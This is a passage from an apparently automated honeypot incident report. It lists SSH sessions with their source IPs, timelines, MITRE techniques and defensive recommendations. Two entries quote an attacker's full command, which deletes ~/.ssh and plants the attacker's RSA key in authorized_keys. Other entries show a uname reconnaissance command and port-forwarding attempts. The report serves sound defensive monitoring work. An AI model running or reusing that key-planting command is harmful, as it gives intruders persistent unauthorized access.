| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:03:46` | `cowrie.session.connect` |
| `2026-07-27 10:03:46` | `cowrie.client.version` |
| `2026-07-27 10:03:47` | `cowrie.client.kex` |
| `2026-07-27 10:03:48` | `cowrie.login.success` |
| `2026-07-27 10:03:48` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-794e7141fba8

| Field | Detail |
|---|---|
| **Source IP** | `163.7.9[.]55` |
| **First Seen** | 2026-07-27 10:03 |
| **Last Seen** | 2026-07-27 10:03 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:03:48` | `cowrie.session.connect` |
| `2026-07-27 10:03:48` | `cowrie.client.version` |
| `2026-07-27 10:03:48` | `cowrie.client.kex` |
| `2026-07-27 10:03:49` | `cowrie.login.success` |
| `2026-07-27 10:03:50` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `163.7.9[.]55` to AbuseIPDB if not already reported
- [ ] Block `163.7.9[.]55` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-87048c3b553a

| Field | Detail |
|---|---|
| **Source IP** | `217.160.194[.]89` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:09` | `cowrie.session.connect` |
| `2026-07-27 10:04:09` | `cowrie.client.version` |
| `2026-07-27 10:04:09` | `cowrie.client.kex` |
| `2026-07-27 10:04:09` | `cowrie.login.success` |
| `2026-07-27 10:04:10` | `cowrie.session.params` |
| `2026-07-27 10:04:10` | `cowrie.command.input` |
| `2026-07-27 10:04:10` | `cowrie.command.failed` |
| `2026-07-27 10:04:10` | `cowrie.log.closed` |
| `2026-07-27 10:04:11` | `cowrie.session.params` |
| `2026-07-27 10:04:11` | `cowrie.command.input` |
| `2026-07-27 10:04:11` | `cowrie.session.file_download` |
| `2026-07-27 10:04:11` | `cowrie.log.closed` |
| `2026-07-27 10:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.194[.]89` to AbuseIPDB if not already reported
- [ ] Block `217.160.194[.]89` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-392c1f227c41

| Field | Detail |
|---|---|
| **Source IP** | `217.160.194[.]89` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:11` | `cowrie.session.connect` |
| `2026-07-27 10:04:11` | `cowrie.client.version` |
| `2026-07-27 10:04:11` | `cowrie.client.kex` |
| `2026-07-27 10:04:12` | `cowrie.login.success` |
| `2026-07-27 10:04:12` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.194[.]89` to AbuseIPDB if not already reported
- [ ] Block `217.160.194[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-80401d892b8f

| Field | Detail |
|---|---|
| **Source IP** | `217.160.194[.]89` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:12` | `cowrie.session.connect` |
| `2026-07-27 10:04:12` | `cowrie.client.version` |
| `2026-07-27 10:04:12` | `cowrie.client.kex` |
| `2026-07-27 10:04:12` | `cowrie.login.success` |
| `2026-07-27 10:04:13` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `217.160.194[.]89` to AbuseIPDB if not already reported
- [ ] Block `217.160.194[.]89` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f7521132b911

| Field | Detail |
|---|---|
| **Source IP** | `103.176.107[.]136` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:24` | `cowrie.session.connect` |
| `2026-07-27 10:04:24` | `cowrie.client.version` |
| `2026-07-27 10:04:24` | `cowrie.client.kex` |
| `2026-07-27 10:04:25` | `cowrie.login.success` |
| `2026-07-27 10:04:26` | `cowrie.session.params` |
| `2026-07-27 10:04:26` | `cowrie.command.input` |
| `2026-07-27 10:04:26` | `cowrie.command.failed` |
| `2026-07-27 10:04:27` | `cowrie.log.closed` |
| `2026-07-27 10:04:28` | `cowrie.session.params` |
| `2026-07-27 10:04:28` | `cowrie.command.input` |
| `2026-07-27 10:04:28` | `cowrie.session.file_download` |
| `2026-07-27 10:04:28` | `cowrie.log.closed` |
| `2026-07-27 10:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.107[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.176.107[.]136` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Run Tool 31 malware analyzer on captured payload(s)
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-dfd161ff908e

| Field | Detail |
|---|---|
| **Source IP** | `103.176.107[.]136` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:28` | `cowrie.session.connect` |
| `2026-07-27 10:04:28` | `cowrie.client.version` |
| `2026-07-27 10:04:29` | `cowrie.client.kex` |
| `2026-07-27 10:04:30` | `cowrie.login.success` |
| `2026-07-27 10:04:30` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.107[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.176.107[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-6a92609fc733

| Field | Detail |
|---|---|
| **Source IP** | `103.176.107[.]136` |
| **First Seen** | 2026-07-27 10:04 |
| **Last Seen** | 2026-07-27 10:04 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:04:31` | `cowrie.session.connect` |
| `2026-07-27 10:04:31` | `cowrie.client.version` |
| `2026-07-27 10:04:31` | `cowrie.client.kex` |
| `2026-07-27 10:04:32` | `cowrie.login.success` |
| `2026-07-27 10:04:32` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.176.107[.]136` to AbuseIPDB if not already reported
- [ ] Block `103.176.107[.]136` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-561dbef485ed

| Field | Detail |
|---|---|
| **Source IP** | `103.174.34[.]49` |
| **First Seen** | 2026-07-27 10:16 |
| **Last Seen** | 2026-07-27 10:16 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:16:26` | `cowrie.session.connect` |
| `2026-07-27 10:16:27` | `cowrie.client.version` |
| `2026-07-27 10:16:27` | `cowrie.client.kex` |
| `2026-07-27 10:16:29` | `cowrie.login.success` |
| `2026-07-27 10:16:30` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:16:34` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `103.174.34[.]49` to AbuseIPDB if not already reported
- [ ] Block `103.174.34[.]49` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4cb5fe57f784

| Field | Detail |
|---|---|
| **Source IP** | `111.171.125[.]94` |
| **First Seen** | 2026-07-27 10:17 |
| **Last Seen** | 2026-07-27 10:17 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:17:15` | `cowrie.session.connect` |
| `2026-07-27 10:17:16` | `cowrie.client.version` |
| `2026-07-27 10:17:16` | `cowrie.client.kex` |
| `2026-07-27 10:17:18` | `cowrie.login.success` |
| `2026-07-27 10:17:19` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:17:24` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `111.171.125[.]94` to AbuseIPDB if not already reported
- [ ] Block `111.171.125[.]94` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8921eec3b50b

| Field | Detail |
|---|---|
| **Source IP** | `218.206.136[.]24` |
| **First Seen** | 2026-07-27 10:19 |
| **Last Seen** | 2026-07-27 10:19 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:19:47` | `cowrie.session.connect` |
| `2026-07-27 10:19:48` | `cowrie.client.version` |
| `2026-07-27 10:19:48` | `cowrie.client.kex` |
| `2026-07-27 10:19:51` | `cowrie.login.success` |
| `2026-07-27 10:19:51` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:19:56` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `218.206.136[.]24` to AbuseIPDB if not already reported
- [ ] Block `218.206.136[.]24` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-4dc6ac648a20

| Field | Detail |
|---|---|
| **Source IP** | `190.12.109[.]162` |
| **First Seen** | 2026-07-27 10:19 |
| **Last Seen** | 2026-07-27 10:20 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:19:56` | `cowrie.session.connect` |
| `2026-07-27 10:19:57` | `cowrie.client.version` |
| `2026-07-27 10:19:57` | `cowrie.client.kex` |
| `2026-07-27 10:19:59` | `cowrie.login.success` |
| `2026-07-27 10:19:59` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:20:04` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `190.12.109[.]162` to AbuseIPDB if not already reported
- [ ] Block `190.12.109[.]162` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-8e5d417f28ab

| Field | Detail |
|---|---|
| **Source IP** | `43.100.93[.]96` |
| **First Seen** | 2026-07-27 10:20 |
| **Last Seen** | 2026-07-27 10:20 |
| **Session Duration** | 2s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `uname -s -m` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:20:15` | `cowrie.session.connect` |
| `2026-07-27 10:20:15` | `cowrie.client.version` |
| `2026-07-27 10:20:15` | `cowrie.client.kex` |
| `2026-07-27 10:20:16` | `cowrie.login.success` |
| `2026-07-27 10:20:17` | `cowrie.session.params` |
| `2026-07-27 10:20:17` | `cowrie.command.input` |
| `2026-07-27 10:20:17` | `cowrie.log.closed` |
| `2026-07-27 10:20:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `43.100.93[.]96` to AbuseIPDB if not already reported
- [ ] Block `43.100.93[.]96` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-28612bafdd62

| Field | Detail |
|---|---|
| **Source IP** | `219.129.96[.]2` |
| **First Seen** | 2026-07-27 10:20 |
| **Last Seen** | 2026-07-27 10:20 |
| **Session Duration** | 9s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:20:44` | `cowrie.session.connect` |
| `2026-07-27 10:20:44` | `cowrie.client.version` |
| `2026-07-27 10:20:44` | `cowrie.client.kex` |
| `2026-07-27 10:20:47` | `cowrie.login.success` |
| `2026-07-27 10:20:48` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:20:53` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `219.129.96[.]2` to AbuseIPDB if not already reported
- [ ] Block `219.129.96[.]2` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cb62bce9cd9c

| Field | Detail |
|---|---|
| **Source IP** | `117.222.52[.]215` |
| **First Seen** | 2026-07-27 10:20 |
| **Last Seen** | 2026-07-27 10:21 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:20:54` | `cowrie.session.connect` |
| `2026-07-27 10:20:55` | `cowrie.client.version` |
| `2026-07-27 10:20:55` | `cowrie.client.kex` |
| `2026-07-27 10:20:57` | `cowrie.login.success` |
| `2026-07-27 10:20:57` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:21:02` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `117.222.52[.]215` to AbuseIPDB if not already reported
- [ ] Block `117.222.52[.]215` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-a3f51cfd8198

| Field | Detail |
|---|---|
| **Source IP** | `182.75.227[.]178` |
| **First Seen** | 2026-07-27 10:23 |
| **Last Seen** | 2026-07-27 10:24 |
| **Session Duration** | 8s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:23:58` | `cowrie.session.connect` |
| `2026-07-27 10:24:00` | `cowrie.client.version` |
| `2026-07-27 10:24:00` | `cowrie.client.kex` |
| `2026-07-27 10:24:02` | `cowrie.login.success` |
| `2026-07-27 10:24:02` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:24:07` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.75.227[.]178` to AbuseIPDB if not already reported
- [ ] Block `182.75.227[.]178` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-aa408298ea0c

| Field | Detail |
|---|---|
| **Source IP** | `191.210.73[.]33` |
| **First Seen** | 2026-07-27 10:24 |
| **Last Seen** | 2026-07-27 10:24 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:24:08` | `cowrie.session.connect` |
| `2026-07-27 10:24:09` | `cowrie.client.version` |
| `2026-07-27 10:24:09` | `cowrie.client.kex` |
| `2026-07-27 10:24:10` | `cowrie.login.success` |
| `2026-07-27 10:24:11` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:24:16` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `191.210.73[.]33` to AbuseIPDB if not already reported
- [ ] Block `191.210.73[.]33` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2d6772cfa1c0

| Field | Detail |
|---|---|
| **Source IP** | `118.26.111[.]107` |
| **First Seen** | 2026-07-27 10:30 |
| **Last Seen** | 2026-07-27 10:31 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:30:40` | `cowrie.session.connect` |
| `2026-07-27 10:30:41` | `cowrie.telnet.option` |
| `2026-07-27 10:30:41` | `cowrie.telnet.option` |
| `2026-07-27 10:31:41` | `cowrie.login.success` |
| `2026-07-27 10:31:42` | `cowrie.session.params` |

**Recommended Actions:**
- [ ] Submit `118.26.111[.]107` to AbuseIPDB if not already reported
- [ ] Block `118.26.111[.]107` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-be4c330b0cc9

| Field | Detail |
|---|---|
| **Source IP** | `112.161.26[.]125` |
| **First Seen** | 2026-07-27 10:41 |
| **Last Seen** | 2026-07-27 10:41 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:41:43` | `cowrie.session.connect` |
| `2026-07-27 10:41:44` | `cowrie.client.version` |
| `2026-07-27 10:41:44` | `cowrie.client.kex` |
| `2026-07-27 10:41:45` | `cowrie.login.success` |
| `2026-07-27 10:41:46` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:41:51` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `112.161.26[.]125` to AbuseIPDB if not already reported
- [ ] Block `112.161.26[.]125` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-cefb2ba53a18

| Field | Detail |
|---|---|
| **Source IP** | `196.188.187[.]85` |
| **First Seen** | 2026-07-27 10:41 |
| **Last Seen** | 2026-07-27 10:41 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:41:51` | `cowrie.session.connect` |
| `2026-07-27 10:41:51` | `cowrie.client.version` |
| `2026-07-27 10:41:51` | `cowrie.client.kex` |
| `2026-07-27 10:41:53` | `cowrie.login.success` |
| `2026-07-27 10:41:53` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:41:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `196.188.187[.]85` to AbuseIPDB if not already reported
- [ ] Block `196.188.187[.]85` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0a58127f3124

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 10:42 |
| **Last Seen** | 2026-07-27 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:42:29` | `cowrie.session.connect` |
| `2026-07-27 10:42:29` | `cowrie.client.version` |
| `2026-07-27 10:42:29` | `cowrie.client.kex` |
| `2026-07-27 10:42:29` | `cowrie.login.success` |
| `2026-07-27 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d1aaebe56ac9

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 10:42 |
| **Last Seen** | 2026-07-27 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:42:29` | `cowrie.session.connect` |
| `2026-07-27 10:42:29` | `cowrie.client.version` |
| `2026-07-27 10:42:29` | `cowrie.client.kex` |
| `2026-07-27 10:42:29` | `cowrie.login.success` |
| `2026-07-27 10:42:29` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-42862a54f97e

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 10:42 |
| **Last Seen** | 2026-07-27 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:42:31` | `cowrie.session.connect` |
| `2026-07-27 10:42:31` | `cowrie.client.version` |
| `2026-07-27 10:42:31` | `cowrie.client.kex` |
| `2026-07-27 10:42:31` | `cowrie.login.success` |
| `2026-07-27 10:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-f40601096dc4

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-07-27 10:42 |
| **Last Seen** | 2026-07-27 10:42 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:42:31` | `cowrie.session.connect` |
| `2026-07-27 10:42:31` | `cowrie.client.version` |
| `2026-07-27 10:42:31` | `cowrie.client.kex` |
| `2026-07-27 10:42:31` | `cowrie.login.success` |
| `2026-07-27 10:42:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-b77f1562b1f3

| Field | Detail |
|---|---|
| **Source IP** | `50.188.204[.]213` |
| **First Seen** | 2026-07-27 10:45 |
| **Last Seen** | 2026-07-27 10:45 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:45:13` | `cowrie.session.connect` |
| `2026-07-27 10:45:14` | `cowrie.client.version` |
| `2026-07-27 10:45:14` | `cowrie.client.kex` |
| `2026-07-27 10:45:15` | `cowrie.login.success` |
| `2026-07-27 10:45:15` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:45:19` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `50.188.204[.]213` to AbuseIPDB if not already reported
- [ ] Block `50.188.204[.]213` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
- [ ] Confirm tunnel target is not internal infrastructure
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5669d8a81c5f

| Field | Detail |
|---|---|
| **Source IP** | `182.156.35[.]238` |
| **First Seen** | 2026-07-27 10:48 |
| **Last Seen** | 2026-07-27 10:48 |
| **Session Duration** | 7s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TCP Tunnel** | ⚠️ `cowrie.direct-tcpip` — port forwarding / proxy attempt |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-07-27 10:48:29` | `cowrie.session.connect` |
| `2026-07-27 10:48:30` | `cowrie.client.version` |
| `2026-07-27 10:48:30` | `cowrie.client.kex` |
| `2026-07-27 10:48:32` | `cowrie.login.success` |
| `2026-07-27 10:48:32` | `cowrie.direct-tcpip.request` |
| `2026-07-27 10:48:37` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `182.156.35[.]238` to AbuseIPDB if not already reported
- [ ] Block `182.156.35[.]238` at perimeter firewall / security group
- [ ] Investigate TCP tunnel target — port forwarding via honeypot
